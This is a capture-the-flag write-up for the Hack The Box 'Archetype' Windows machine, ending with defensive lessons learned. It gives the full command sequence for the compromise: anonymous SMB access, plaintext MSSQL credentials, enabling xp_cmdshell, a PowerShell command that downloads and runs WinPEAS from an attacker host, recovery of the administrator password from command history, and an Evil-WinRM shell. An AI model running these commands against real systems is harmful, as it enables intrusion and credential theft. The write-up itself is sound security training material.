# CTF Writeup — Archetype

## 📌 Overview

* **Platform:** Hack The Box
* **Difficulty:** Very Easy
* **OS:** Windows
* **Objective:** User flag + Root flag (Full compromise)

Archetype is a Windows machine exposing an unauthenticated SMB share containing a misconfigured MSSQL configuration file. Credentials recovered from the file grant `sysadmin` access to the SQL Server, which is leveraged to achieve Remote Code Execution via `xp_cmdshell`. Post-exploitation enumeration of PowerShell command history reveals administrator credentials, enabling full system compromise through WinRM.

---

## 🔍 Enumeration

### 1. Initial Reconnaissance

A full-service scan was performed with RustScan to quickly identify open ports, followed by aggressive service detection.

```bash
rustscan -a 10.129.192.205 -- -A
```

**Results:**

| Port | Service | Notes |
|------|---------|-------|
| 135  | MS-RPC  | Standard Windows RPC |
| 445  | SMB     | File sharing — high-value target |
| 1433 | MSSQL   | Microsoft SQL Server |
| 5985 | WinRM   | Windows Remote Management (HTTP) |

The combination of SMB, MSSQL, and WinRM immediately suggested a Windows enterprise-style attack surface. SMB was prioritized first as it may expose accessible shares without authentication.

---

### 2. Further Enumeration

#### SMB Share Enumeration

Shares were listed using a null session (no credentials):

```bash
smbclient -L //10.129.192.205 -N
```

A non-default share named `backups` was identified among the standard administrative shares (`ADMIN$`, `C$`, `IPC$`). Anonymous read access to this share was tested:

```bash
smbclient //10.129.192.205/backups
```

The share was accessible without credentials and contained a single file:

```
prod.dtsConfig   AR   609   Mon Jan 20 09:23:02 2020
```

The file was retrieved for analysis:

```bash
smb: \> get prod.dtsConfig
```

#### Credential Discovery in Configuration File

Inspecting the downloaded file revealed a SQL Server Data Transformation Services (DTS) configuration containing a plaintext connection string:

```bash
cat prod.dtsConfig
```

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
Auto Translate=False;</ConfiguredValue>
```

**Credentials extracted:**

```
Username: ARCHETYPE\sql_svc
Password: M3g4c0rp123
```

The credentials were identified as SQL Server credentials, making the exposed MSSQL service on port 1433 the logical next target.

---

## 💥 Exploitation

**Vulnerability:** Hardcoded credentials in an exposed SMB configuration file leading to authenticated MSSQL access and Remote Code Execution via `xp_cmdshell`.

**Type:** Credential Exposure → RCE  
**Location:** SMB `backups` share → MSSQL Server  
**Impact:** Unauthenticated file access yielded OS-level command execution as `ARCHETYPE\sql_svc`

#### Authenticating to MSSQL

The Impacket `mssqlclient.py` script was used to authenticate against the SQL Server using Windows authentication:

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.192.205
```

The connection succeeded and landed on Microsoft SQL Server 2017 RTM (14.0.1000).

#### Confirming Sysadmin Privileges

Before attempting command execution, the privilege level of the current user was verified:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin','ARCHETYPE\sql_svc')
```

The function returned `1`, confirming `sql_svc` holds the `sysadmin` server role — the highest privilege level in SQL Server.

#### Enabling and Abusing xp_cmdshell

`xp_cmdshell` was disabled by default as a security hardening measure. It was re-enabled via `sp_configure` following standard SQL Server procedure:

```sql
USE master;
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE sp_configure 'show advanced options', 0;
RECONFIGURE;
```

OS-level command execution was then confirmed:

```sql
EXEC xp_cmdshell 'whoami'
-- Output: archetype\sql_svc

EXEC xp_cmdshell 'echo %cd%'
-- Output: C:\Windows\system32
```

---

## 🔓 Privilege Escalation

### Local Enumeration

With command execution established, WinPEAS was transferred to the target for automated enumeration of privilege escalation vectors. A Python HTTP server was used to serve the binary from the attacker machine:

```bash
# On attacker machine
cd /usr/share/peass/winpeas
python3 -m http.server 8000
```

```sql
-- Download WinPEAS to target
EXEC xp_cmdshell 'powershell -c "iwr http://10.10.14.188:8000/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe"'

-- Execute and save output
EXEC xp_cmdshell 'C:\Windows\Temp\wp.exe > C:\Windows\Temp\peas.txt'
```

### Identified Vector — PowerShell Command History

WinPEAS flagged the PowerShell `PSReadLine` command history file, a common source of previously executed commands and credentials:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

The file was read directly via `xp_cmdshell`:

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
```

**Output:**

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Administrator credentials were recovered in cleartext from a previously executed `net use` command:

```
Username: administrator
Password: MEGACORP_4dm1n!!
```

### Escalation via Evil-WinRM

With WinRM (port 5985) accessible, the administrator credentials were used to establish a privileged remote shell:

```bash
evil-winrm -i 10.129.192.205 -u administrator -p 'MEGACORP_4dm1n!!'
```

Full administrative access to the target was obtained. Both flags were retrieved from their respective locations:

```powershell
# User flag
type C:\Users\sql_svc\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🧠 Lessons Learned

**Credential exposure in configuration files is a critical risk.** The `prod.dtsConfig` file contained a plaintext connection string to a privileged SQL Server account. Configuration files of this type should never be stored in unauthenticated network shares and should use encrypted credential stores.

**Anonymous SMB access should always be disabled in production environments.** The initial foothold was achieved entirely because the `backups` share permitted null session access — a misconfiguration that required no exploitation skill to abuse.

**`xp_cmdshell` is a high-severity capability that should be disabled by default.** SQL Server ships with it disabled, but sysadmin-level access is sufficient to re-enable it. The real root cause here is over-privileged service accounts: a SQL service account should never hold the `sysadmin` role.

**PowerShell command history is a treasure trove during post-exploitation.** The `ConsoleHost_history.txt` file exposed administrator credentials entered in a previous session. In real engagements, defenders should be aware that this file persists across sessions and consider clearing it or restricting read access. Attackers should make it a standard enumeration target on Windows machines.

**WinRM enables lateral movement when combined with valid credentials.** Port 5985 open alongside recovered credentials allowed immediate access without any further exploitation. Multi-factor authentication or network-level restrictions on WinRM would break this step.

---

## 🧩 Tools Used

* **RustScan** — Fast port scanning
* **smbclient** — SMB share enumeration and file retrieval
* **Impacket (mssqlclient.py)** — Authenticated MSSQL interaction
* **WinPEAS** — Windows privilege escalation enumeration
* **Evil-WinRM** — Remote shell via Windows Remote Management

---

## ⚠️ Notes

* Flags are intentionally omitted from this writeup
* This writeup focuses on methodology, reasoning, and learning outcomes

---
